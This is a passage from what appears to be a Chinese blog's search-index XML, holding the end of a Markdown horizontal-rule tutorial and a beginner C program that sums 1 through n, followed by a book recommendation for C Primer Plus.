id="四、分割线"><a href="#四、分割线" class="headerlink" title="四、分割线"></a>四、分割线</h1><p>三个或者三个以上的 - 或者 * 都可以。<br>示例：<br>\1. —<br>\2. —-<br>\3. <strong>*<br>\4. ***</strong></p><h2 id="效果："><a href="#效果：" class="headerlink" title="效果："></a>效果：</h2><hr><hr><hr><blockquote><p>持续更新中</p></blockquote><p><a href="https://www.jianshu.com/p/191d1e21f7ed/">文章内容来源</a></p>]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂项 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前n项和</title>
      <link href="2020/11/19/%E5%89%8Dn%E9%A1%B9%E5%92%8C/"/>
      <url>2020/11/19/%E5%89%8Dn%E9%A1%B9%E5%92%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="计算前n项和（C语言）"><a href="#计算前n项和（C语言）" class="headerlink" title="计算前n项和（C语言）"></a>计算前n项和（C语言）</h1><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; &#x2F;&#x2F;计算1+2+3+...+n </span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">int a, b, c, d;</span><br><span class="line">b &#x3D; 0;</span><br><span class="line">c &#x3D; 0;</span><br><span class="line">printf(&quot;请输入1开始程序\n&quot;);</span><br><span class="line">while(scanf(&quot;%d&quot;, &amp;d) &#x3D;&#x3D; 1)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;请输入n（为数字），输出结果为：1+2+3+...+n\n&quot;);</span><br><span class="line">    scanf(&quot;%d&quot;, &amp;a);</span><br><span class="line">    while (b &lt;&#x3D; a)</span><br><span class="line">        &#123;</span><br><span class="line">         c &#x3D; b + c;</span><br><span class="line">         b++; </span><br><span class="line">        &#125;</span><br><span class="line">    printf(&quot;1+2+3+...+n &#x3D; %d\n&quot;, c);</span><br><span class="line">    printf(&quot;请输入q离开程序，或者输入1再次开始程序计算令一个1+2+3+...+n\n&quot;);</span><br><span class="line">    b &#x3D; 0;</span><br><span class="line">    c &#x3D; 0;</span><br><span class="line">   &#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>因本人能力限制，不会其他的函数，所以此代码比较复杂。</p></blockquote><hr><h2 id="推荐一本C语言入门书籍"><a href="#推荐一本C语言入门书籍" class="headerlink" title="推荐一本C语言入门书籍"></a>推荐一本C语言入门书籍</h2><p><img src="https://img1.doubanio.com/view/subject/l/public/s29438897.jpg" alt="C Primer Plus"><br><a href="https://item.jd.com/12627795.html">购买C Primer Plus（京东）</a></p>]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
          <category> 编程练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C/C++-编程练习 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
